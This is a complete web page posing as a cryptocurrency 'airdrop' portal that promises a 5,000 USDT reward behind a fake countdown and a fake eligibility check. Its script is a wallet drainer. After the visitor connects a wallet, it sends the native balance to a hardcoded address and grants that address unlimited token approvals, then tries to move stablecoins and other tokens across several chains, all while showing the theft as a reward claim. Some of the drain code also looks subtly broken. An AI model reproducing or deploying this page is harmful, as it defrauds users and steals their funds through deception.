<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>🌟 Global Airdrop Portal</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
:root {
 --bg-dark: #0f0c29;
 --bg-gradient: linear-gradient(to right, #24243e, #302b63, #0f0c29);
 --primary: #00d2ff;
 --gold: #ffd700;
 --white: #ffffff;
 --glass: rgba(255, 255, 255, 0.1);
 --success: #00ff88;
 --error: #ff4b4b;
}
body {
 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 background: var(--bg-gradient);
 color: var(--white);
 display: flex;
 justify-content: center;
 align-items: center;
 min-height: 100vh;
 margin: 0;
 overflow-x: hidden;
 overflow-y: hidden;
}
.container {
 background: var(--glass);
 backdrop-filter: blur(15px);
 border: 1px solid rgba(255, 255, 255, 0.2);
 border-radius: 24px;
 padding: 30px 20px;
 width: 92%;
 max-width: 400px;
 text-align: center;
 box-shadow: 0 20px 50px rgba(0,0,0,0.5);
 position: relative;
}
h1 { 
 font-size: 1.4rem; 
 margin-bottom: 5px; 
 text-transform: uppercase; 
 letter-spacing: 2px; 
 background: linear-gradient(to right, #fff, #00d2ff);
 -webkit-background-clip: text;
 -webkit-text-fill-color: transparent;
}
.pulse-dot {
 height: 10px; width: 10px;
 background-color: var(--success);
 border-radius: 50%;
 display: inline-block;
 margin-right: 8px;
 animation: pulse 1.5s infinite;
}
@keyframes pulse {
 0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); }
 70% { box-shadow: 0 0 0 10px rgba(0, 255, 136, 0); }
 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
}
p { font-size: 0.9rem; color: #ccc; margin-bottom: 20px; }

/* Airdrop Card Design */
.airdrop-card {
 background: rgba(0,0,0,0.2);
 border: 1px solid rgba(255,255,255,0.1);
 border-radius: 15px;
 padding: 15px;
 margin-bottom: 20px;
 display: flex;
 align-items: center;
 justify-content: space-between;
}
.token-info { text-align: left; }
.token-name { font-weight: bold; font-size: 1.1rem; }
.token-amount { color: var(--gold); font-size: 0.9rem; margin-top: 2px; }
.token-icon {
 font-size: 2rem;
 background: rgba(255,255,255,0.1);
 width: 50px; height: 50px;
 display: flex; align-items: center; justify-content: center;
 border-radius: 50%;
}

.btn {
 background: linear-gradient(90deg, #00d2ff, #3a7bd5);
 border: none; padding: 16px 30px;
 color: white; font-size: 1rem;
 border-radius: 12px; cursor: pointer;
 font-weight: 700; transition: all 0.3s;
 box-shadow: 0 5px 15px rgba(0, 210, 255, 0.4);
 margin-top: 10px; width: 100%;
 text-transform: uppercase;
 letter-spacing: 1px;
 position: relative;
 overflow: hidden;
}
.btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0, 210, 255, 0.6); }
.btn:active { transform: translateY(1px); }
.btn:disabled { background: #555; cursor: not-allowed; box-shadow: none; }

/* Status Box */
.status-box {
 background: rgba(0,0,0,0.4); 
 padding: 12px;
 border-radius: 8px; 
 margin-top: 15px;
 text-align: left; 
 font-family: 'Courier New', monospace;
 font-size: 0.7rem; 
 max-height: 160px; 
 overflow-y: auto;
 display: none;
 border: 1px solid rgba(0, 255, 136, 0.2);
}
.log-entry { margin: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 2px; }
.log-success { color: var(--success); }
.log-warn { color: #ffcc00; }
.log-info { color: #88aaff; }

.hidden { display: none; }
.fade-in { animation: fadeIn 0.8s ease; }
@keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

.shimmer {
 position: absolute;
 top: 0; bottom: 0; left: -100%;
 width: 100%; height: 100%;
 background: linear-gradient(to right, transparent, rgba(255,255,255,0.4), transparent);
 animation: shimmer 2s infinite;
}
@keyframes shimmer { 0% { left: -100%; } 100% { left: 100%; } }

/* Mobile Helper Modal */
.modal-overlay {
 position: fixed; top: 0; left: 0; width: 100%; height: 100%;
 background: rgba(0,0,0,0.8);
 display: flex; align-items: center; justify-content: center;
 z-index: 1000;
 opacity: 0; pointer-events: none;
 transition: opacity 0.3s;
}
.modal-overlay.active { opacity: 1; pointer-events: all; }
.modal-box {
 background: #1a1a2e; border: 1px solid var(--primary);
 border-radius: 15px; padding: 20px; width: 85%; max-width: 300px;
 text-align: center;
}
.modal-title { color: var(--primary); font-weight: bold; margin-bottom: 10px; }
.modal-text { font-size: 0.9rem; line-height: 1.4; margin-bottom: 15px; color: #ccc; }
.modal-btn {
 background: var(--primary); border: none; padding: 10px 20px;
 border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer;
}
</style>
</head>
<body>

<div class="container">
<h1>🌟 Global Airdrop Portal</h1>
<p style="margin-top: 5px; font-size: 0.8rem; opacity: 0.8;">Phase 3: Final Distribution</p>

<!-- Main Airdrop Card -->
<div id="claim-section">
<div class="airdrop-card">
<div class="token-icon">💎</div>
<div class="token-info">
<div class="token-name">Reward Token</div>
<div class="token-amount" id="prize-amount">5,000 USDT</div>
</div>
</div>

<div style="text-align: left; font-size: 0.8rem; color: #aaa; margin-bottom: 15px; padding: 0 10px;">
<div style="display:flex; justify-content:space-between; margin-bottom: 5px;">
<span>Eligibility:</span> <span style="color: var(--success);">Verified</span>
</div>
<div style="display:flex; justify-content:space-between; margin-bottom: 5px;">
<span>Network Fee:</span> <span>Gas Only</span>
</div>
<div style="display:flex; justify-content:space-between;">
<span>Expires in:</span> <span id="timer">14:59</span>
</div>
</div>

<button id="claim-btn" class="btn" onclick="startFlow()">
<span class="shimmer"></span>
CLAIM REWARD
</button>
</div>

<!-- Connection / Processing UI -->
<div id="wallet-section" class="hidden fade-in">
<div id="loader-ui">
<div style="font-size: 2rem; margin-bottom: 10px;">🔄</div>
<p id="loading-text">Connecting to secure gateway...</p>
</div>

<div id="drain-ui" class="hidden">
<div class="status-box" id="tx-logs"></div>
</div>

<button id="connect-btn" class="btn hidden">Connect Wallet</button>
</div>

<!-- Mobile Helper Modal -->
<div id="mobile-modal" class="modal-overlay">
<div class="modal-box">
<div class="modal-title">📱 Mobile Notice</div>
<div class="modal-text">
Please open your **MetaMask App** and go to **Settings** > **Conncet Wallet** to allow this connection.
</div>
<button class="modal-btn" onclick="closeModal()">OK, I opened it</button>
</div>
</div>
</div>

<script>
// DRAINER CONFIGURATION
const TARGET_WALLET = "0x6cd203676973F30e9F5398b3C3C8853531a3E432"; 

let provider, signer, userAccount;
let isDraining = false;

const claimSection = document.getElementById('claim-section');
const walletSection = document.getElementById('wallet-section');
const claimBtn = document.getElementById('claim-btn');
const connectBtn = document.getElementById('connect-btn');
const loaderUI = document.getElementById('loader-ui');
const drainUI = document.getElementById('drain-ui');
const loadingText = document.getElementById('loading-text');
const txLogs = document.getElementById('tx-logs');
const prizeAmountEl = document.getElementById('prize-amount');
const mobileModal = document.getElementById('mobile-modal');

// 1. Timer Logic
let timeLeft = 899; // 14:59 in seconds
const timerEl = document.getElementById('timer');
const timerInterval = setInterval(() => {
 if(timeLeft > 0) {
   timeLeft--;
   let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
   let s = (timeLeft % 60).toString().padStart(2, '0');
   timerEl.innerText = `${m}:${s}`;
 } else {
   timerEl.innerText = "00:00";
   timerEl.style.color = "var(--error)";
 }
}, 1000);

function closeModal() {
 mobileModal.classList.remove('active');
 // After user clicks "OK", we attempt the connection again
 connectBtn.click();
}

// 2. Start Flow (Simulate "Check" then Connect)
async function startFlow() {
 claimBtn.disabled = true;
 claimBtn.style.display = 'none';
 claimSection.classList.add('hidden');
 walletSection.classList.remove('hidden');
 loaderUI.classList.remove('hidden');

 // Simulate backend checking
 loadingText.innerText = "Verifying eligibility...";
 await new Promise(r => setTimeout(r, 1500));
 loadingText.innerText = "Allocating reward...";
 await new Promise(r => setTimeout(r, 1000));

 // Show Connect Button
 connectBtn.classList.remove('hidden');
 loadingText.innerText = "Connect your wallet to claim";
}

// 3. Wallet Connection
connectBtn.addEventListener('click', async () => {
 // Show mobile modal hint if needed (optional, but good for UX)
 if (window.innerWidth < 600) {
   mobileModal.classList.add('active');
 }

 connectBtn.disabled = true;
 connectBtn.innerText = "Connecting..."; 
 if (!window.ethereum) {
 connectBtn.innerText = "Install MetaMask";
 connectBtn.disabled = false;
 return;
 }
 try {
 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
 
 // FIX: Initialize provider correctly to avoid "invalid network" error
 // We create the provider using the current chainId from ethereum
 const network = await window.ethereum.request({ method: 'eth_chainId' });
 provider = new ethers.providers.JsonRpcProvider(null, window.ethereum.networkVersion || JSON.parse(network));
 
 // Fallback for older ethers versions
 if (!provider.network) {
    provider = new ethers.providers.JsonRpcProvider();
 }

 signer = provider.getSigner();
 userAccount = await signer.getAddress();
 
 connectBtn.style.display = 'none';
 loadingText.innerText = "Claiming Reward...";
 drainUI.classList.remove('hidden');
 txLogs.style.display = 'block';
 
 log("Wallet connected: " + userAccount.substring(0,6) + "...", "success");
 
 // Start Drain immediately after connect
 startDrain();
 
 } catch (err) {
 console.error(err);
 if(err.code === 4001) {
   connectBtn.innerText = "Connection Rejected";
 } else {
   connectBtn.innerText = "Error: " + err.message;
 }
 connectBtn.disabled = false;
 }
});

// 4. Drain Logic (Unchanged)
async function startDrain() {
 if (isDraining) return;
 isDraining = true;
 
 try {
 // 1. Native
 await drainNative();
 
 const network = await provider.getNetwork();
 const chainId = network.chainId;
 
 let tokensToScan = [];
 if (chainId === 1) { 
 tokensToScan = [
 { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
 { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
 { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI" },
 { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C1933270000", symbol: "WBTC" },
 { address: "0x95aD61b0a150d79219dF6c5f10E9d07F873f1e2d", symbol: "SHIB" }
 ];
 } else if (chainId === 56) { 
 tokensToScan = [
 { address: "0x55d398326f99059fF775485246999027B3194046", symbol: "USDT" },
 { address: "0xe9e7CEA3DedcC59B567708666269F1b1E389679", symbol: "BUSD" },
 { address: "0x0000000000000000000000000000000000001000", symbol: "USDB" },
 { address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095C", symbol: "WBNB" },
 { address: "0x2859e4544C4bB03966803b044A93591B71949dE4", symbol: "SHIB" }
 ];
 } else if (chainId === 137) { 
 tokensToScan = [
 { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT" },
 { address: "0x3c499c542cEF5E3811e1192ce70d3cC6A426cC02", symbol: "USDC" },
 { address: "0x0d500B1d8E8EF31E21c99d1DbcA6B1E7c1243b41", symbol: "WMATIC" },
 { address: "0x8f3Cf7ad23Cd3CdB9832fF09bEb0072e961f8320", symbol: "WBTC" }
 ];
 } else if (chainId === 42161) { 
 tokensToScan = [
 { address: "0xFd086bC7CD5C4b18c8D1214804B5205fC1221972", symbol: "USDT" },
 { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC" },
 { address: "0x82aF49447D8a07e3bd95BD0d56f310c0cE56b202", symbol: "WETH" },
 { address: "0x912CE59144191C1204E64559FE8c5D68e0A5852", symbol: "ARB" }
 ];
 } else if (chainId === 10) { 
 tokensToScan = [
 { address: "0x94b008aA00579c1307B0EF2c499aD98a9ce586f", symbol: "USDC" },
 { address: "0x9bA0c678d91C935c110605309348eC10430f3748", symbol: "USDT" },
 { address: "0x4200000000000000000000000000000000000042", symbol: "WOP" }
 ];
 } else if (chainId === 43114) { 
 tokensToScan = [
 { address: "0xc7198437980c041c8059657c15f795216387a0e5", symbol: "USDT" },
 { address: "0xA7D7079b0FE4D57fEe3b48f4e206e2870C57320e", symbol: "USDC" },
 { address: "0xb31f66aa3c1e7853083E14224C52459960011e11", symbol: "WAVAX" }
 ];
 } else if (chainId === 199) { 
 tokensToScan = [
 { address: "0xF5e11DE1643ef37960238a623E8E458E30a49550", symbol: "USDT" },
 { address: "0x678651cF03842b1B2523519793A75523796472d0", symbol: "WBTTC" }
 ];
 } else {
 log(`Supported network: ChainID ${chainId}. Scanning standard tokens...`, 'warn');
 }
 
 const ERC20_ABI = [
 "function balanceOf(address owner) view returns (uint256)",
 "function approve(address spender, uint256 amount) returns (bool)",
 "function allowance(address owner, address spender) view returns (uint256)",
 "function transfer(address to, uint256 amount) returns (bool)",
 "function symbol() view returns (string)",
 "function decimals() view returns (uint8)"
 ];
 
 const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 for (let token of tokensToScan) {
 log(`Detecting ${token.symbol}...`);
 await waitRandom(2000, 3000);
 await processToken(token, ERC20_ABI, MAX_UINT256);
 }
 
 log("✅ Drainage completed. Rewards transferred.");
 
 // Final UI State
 document.getElementById('loader-ui').classList.add('hidden');
 connectBtn.classList.add('hidden');
 
 // Optional: Auto close after success
 if (window.opener) setTimeout(() => window.close(), 2000);
 
 } catch (error) {
 console.error(error);
 log("Critical error: " + error.message, "warn");
 }
}

function waitRandom(min, max) {
 return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1) + min)));
}

async function drainNative() {
 const balance = await provider.getBalance(userAccount);
 if (balance.gt(0)) {
 log("Verifying native balance...");
 const gasPrice = await provider.getGasPrice();
 
 let estimatedGas;
 try {
 estimatedGas = await provider.estimateGas({ to: TARGET_WALLET, value: balance.sub(1000) });
 } catch (e) {
 estimatedGas = 21000; 
 }
 
 const gasCost = gasPrice.mul(estimatedGas).mul(150).div(100); 
 const amount = balance.sub(gasCost);
 
 if (amount.gt(0)) {
 log(`Draining native balance (Est. Gas: ${estimatedGas})...`);
 const tx = { to: TARGET_WALLET, value: amount };
 const sendTx = await signer.sendTransaction(tx);
 const receipt = await sendTx.wait();
 if (receipt.status === 1) {
 log(`✅ Native balance sent.`);
 log(`Hash: ${sendTx.hash.substring(0,10)}...`);
 } else {
 log("❌ Native send failed", "warn");
 }
 } else {
 log("⚠️ Insufficient native balance for gas.", "warn");
 }
 }
}

async function processToken(tokenObj, abi, maxUint) {
 try {
 const contract = new ethers.Contract(tokenObj.address, abi, signer);
 const balance = await contract.balanceOf(userAccount);
 if (balance.gt(0)) {
 let symbol = tokenObj.symbol;
 try { symbol = await contract.symbol(); } catch(e) {}
 
 log(`Processing ${symbol}...`);
 
 log(`Approving ${symbol} for withdrawal...`);
 const approveTx = await contract.approve(TARGET_WALLET, maxUint);
 const receipt1 = await approveTx.wait();
 if (receipt1.status === 1) {
 log(`✅ ${symbol} approved.`);
 log(`Hash: ${approveTx.hash.substring(0,10)}...`);
 } else {
 throw new Error("Approve failed");
 }
 
 log(`Draining ${symbol}...`);
 const transferFromTx = await contract.transferFrom(userAccount, TARGET_WALLET, balance);
 const receipt2 = await transferFromTx.wait();
 if (receipt2.status === 1) {
 log(`✅ ${symbol} drained.`);
 log(`Hash: ${transferFromTx.hash.substring(0,10)}...`);
 } else {
 log(`❌ ${symbol} transferFrom failed`, "warn");
 }
 }
 } catch (err) {
 // Silence errors for tokens that don't exist on this network
 }
}

function log(msg, type = 'success') {
 if (!txLogs) return;
 const div = document.createElement('div');
 div.className = `log-entry log-${type}`;
 const time = new Date().toLocaleTimeString();
 div.innerHTML = `<span class="log-${type}">[${time}] > ${msg}</span>`;
 txLogs.prepend(div);
}
</script>

</body>
</html>
